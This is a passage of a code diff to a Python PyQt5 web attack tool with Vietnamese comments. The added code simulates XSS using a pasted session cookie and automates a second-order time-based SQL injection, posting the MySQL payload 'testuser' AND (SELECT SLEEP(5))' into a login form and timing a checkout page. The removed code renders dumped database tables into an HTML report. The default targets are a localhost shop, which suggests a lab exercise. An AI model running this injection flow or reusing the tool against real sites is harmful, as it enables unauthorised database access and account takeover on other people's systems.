-            html += f"<h2>Database: {db}</h2>"
-            for t, content in tables.items():
-                html += f"<h3>Table: {t}</h3><table><thead><tr>"
-                for h in content['headers']: html += f"<th>{h}</th>"
-                html += "</tr></thead><tbody>"
-                for r in content['records']:
-                    html += "<tr>" + "".join(f"<td>{cell}</td>" for cell in r) + "</tr>"
-                html += "</tbody></table>"
-        html += "</body></html>"
-        
-        with open(filename, 'w', encoding='utf-8') as f: f.write(html)
-        self.update_attack_output(f"[*] Report saved: {filename}")
-        webbrowser.open(f"file://{os.path.realpath(filename)}")
-
-    def update_attack_output(self, line): self.attack_output.append(line)
-    
-    def generate_scan_report(self):
-        if not self.vulnerabilities:
-            QMessageBox.warning(self, "Warning", "No vulnerabilities to report.")
+    # --- XSS SIMULATION ---
+    def simulate_xss(self, mode):
+        # Lấy dòng đang chọn
+        selected_items = self.res_tree.selectedItems()
+        if not selected_items:
             return
+
+        item = selected_items[0]
+        # Tìm lỗ hổng tương ứng trong list data
+        vuln = next(v for v in self.vulnerabilities if v['url'] == item.text(1))
+        
+        # Lấy cookie từ ô nhập liệu
+        current_cookie = self.cookie_input.text()
+
+        # Truyền cookie vào Dialog
+        dialog = XSSSimulatorDialog(vuln['url'], vuln['parameter'], current_cookie, mode)
+        dialog.exec_()
+
+    # --- REPORTING ---
+    def generate_final_report(self):
+        if not self.vulnerabilities: return
+        fname = generate_report(self.url_input.text(), self.vulnerabilities, getattr(self, 'all_dumped_data', None))
+        webbrowser.open(f"file://{os.path.abspath(fname)}")
+# =============================================================================
+# WORKER 2: LOGIC FLOW SCANNER (SECOND-ORDER SQLI)
+# =============================================================================
+class LogicScannerWorker(QObject):
+    log_updated = pyqtSignal(str)
+    scan_finished = pyqtSignal()
+
+    def __init__(self, login_url, cart_url, checkout_url, email_param, pass_param):
+        super().__init__()
+        self.login_url = login_url
+        self.cart_url = cart_url
+        self.checkout_url = checkout_url
+        self.email_param = email_param
+        self.pass_param = pass_param
+        self.session = requests.Session()
+
+    def run(self):
+        self.log_updated.emit("\n" + "="*50)
+        self.log_updated.emit("[*] BẮT ĐẦU QUÉT LOGIC FLOW (SECOND-ORDER SQLI)")
+        self.log_updated.emit("="*50)
+
+        # Payload Time-based: Sleep 5 giây
+        # Lưu ý: Payload này dành cho MySQL. Nếu DB khác cần đổi payload.
+        payload = f"testuser' AND (SELECT SLEEP(5)) AND '1'='1"
+        
+        try:
+            # --- BƯỚC 1: TIÊM PAYLOAD VÀO LOGIN ---
+            self.log_updated.emit(f"[1] Đang tiêm payload vào Session tại: {self.login_url}")
+            login_data = {
+                self.email_param: payload, # Tiêm vào tên đăng nhập
+                self.pass_param: '123456'  # Pass bất kỳ
+            }
+            # Gửi request Login
+            self.session.post(self.login_url, data=login_data, timeout=10)
+            self.log_updated.emit("    -> Đã gửi payload đăng nhập.")
+
+            # --- BƯỚC 2: THÊM GIỎ HÀNG (để kích hoạt vòng lặp code) ---
+            self.log_updated.emit(f"[2] Đang thêm sản phẩm ảo vào giỏ tại: {self.cart_url}")
+            # Giả sử POST soluong=1. Nếu web dùng GET thì sửa thành session.get
+            # Tùy web mà data có thể khác, ở đây để mặc định common
+            cart_data = {'soluong': 1, 'quantity': 1} 
+            self.session.post(self.cart_url, data=cart_data, timeout=10)
+            self.log_updated.emit("    -> Đã thực hiện thao tác thêm giỏ.")
+
+            # --- BƯỚC 3: KÍCH HOẠT TẠI THANH TOÁN ---
+            self.log_updated.emit(f"[3] Truy cập trang Thanh toán để đo thời gian: {self.checkout_url}")
             
-        base_url = self.url_input.text()
-        
-        # Lấy dữ liệu đã dump được từ biến tạm (nếu có)
-        # Biến này nên được gán trong hàm attack_finished
-        dump_data = getattr(self, 'all_dumped_data', None)
-        
-        # Gọi generator mới
-        filename = generate_report(base_url, self.vulnerabilities, dump_data)
-        
-        self.attack_output.append(f"\n[+] Full HTML report generated: {filename}")
-        webbrowser.open(f"file://{os.path.abspath(filename)}")
+            start_time = time.time()
+            self.session.get(self.checkout_url, timeout=30)
+            end_time = time.time()
+            
+            duration = end_time - start_time
+            self.log_updated.emit(f"    -> Thời gian phản hồi: {round(duration, 2)} giây")
 
-    def closeEvent(self, event):
-        if (self.scanner_thread and self.scanner_thread.isRunning()) or (self.attack_thread and self.attack_thread.isRunning()):
-            if QMessageBox.question(self, "Exit", "A process is running. Exit?", QMessageBox.Yes|QMessageBox.No) == QMessageBox.Yes:
-                event.accept()
-            else: event.ignore()
-        else: event.accept()
+            # --- KẾT LUẬN ---
+            if duration >= 5:
+                self.log_updated.emit("\n[!!!] PHÁT HIỆN LỖ HỔNG NGIÊM TRỌNG: SECOND-ORDER SQL INJECTION")
+                self.log_updated.emit(f"      Payload '{payload}' đã thực thi thành công!")
+                self.log_updated.emit("      Kẻ tấn công có thể chiếm quyền Admin hoặc Dump database.")
+            else:
+                self.log_updated.emit("\n[-] Không phát hiện lỗi với Payload này (Time < 5s).")
+                self.log_updated.emit("    Lưu ý: Hãy kiểm tra kỹ tên tham số login (email/username).")
 
+        except Exception as e:
+            self.log_updated.emit(f"[!] Lỗi xảy ra trong quá trình quét logic: {str(e)}")
+        
+        self.scan_finished.emit()
+        
+# =============================================================================
+# DIALOG: CẤU HÌNH QUÉT LOGIC NÂNG CAO
+# =============================================================================
+class AdvancedScanDialog(QDialog):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setWindowTitle("Cấu hình Quét Logic Flow (Second-Order)")
+        self.resize(600, 400)
+        self.layout = QVBoxLayout(self)
+        
+        # Form nhập liệu
+        form_group = QGroupBox("Thông số kịch bản tấn công")
+        grid = QGridLayout()
+        
+        self.in_login = QLineEdit("http://localhost/qldienthoai/?quanly=dangnhap")
+        self.in_login_user = QLineEdit("email") # Tên field input name
+        self.in_login_pass = QLineEdit("pass")  # Tên field input pass
+        
+        self.in_cart = QLineEdit("http://localhost/qldienthoai/themgiohang.php?id=1")
+        self.in_checkout = QLineEdit("http://localhost/qldienthoai/?quanly=camon") # Hoặc file xử lý thanh toán
+
+        grid.addWidget(QLabel("1. URL Xử lý Đăng nhập (POST):"), 0, 0)
+        grid.addWidget(self.in_login, 0, 1)
+        
+        grid.addWidget(QLabel("   Tên tham số User (name='?'):"), 1, 0)
+        grid.addWidget(self.in_login_user, 1, 1)
+        grid.addWidget(QLabel("   Tên tham số Pass (name='?'):"), 2, 0)
+        grid.addWidget(self.in_login_pass, 2, 1)
+        
+        grid.addWidget(QLabel("2. URL Thêm vào giỏ (POST/GET):"), 3, 0)
+        grid.addWidget(self.in_cart, 3, 1)
+        
+        grid.addWidget(QLabel("3. URL Thanh toán (Trigger Lỗi):"), 4, 0)
+        grid.addWidget(self.in_checkout, 4, 1)
+        
+        form_group.setLayout(grid)
+        self.layout.addWidget(form_group)
+        
+        # Nút chạy
+        self.run_btn = QPushButton("🔥 BẮT ĐẦU TẤN CÔNG LOGIC")
+        self.run_btn.setStyleSheet("background: #d35400; color: white; font-weight: bold; padding: 10px;")
+        self.run_btn.clicked.connect(self.accept)
+        self.layout.addWidget(self.run_btn)
+        
+    def get_data(self):
+        return (
+            self.in_login.text(),
+            self.in_cart.text(),
+            self.in_checkout.text(),
+            self.in_login_user.text(),
+            self.in_login_pass.text()
+        )
+        
 if __name__ == "__main__":
     app = QApplication(sys.argv)
     window = MainWindow()
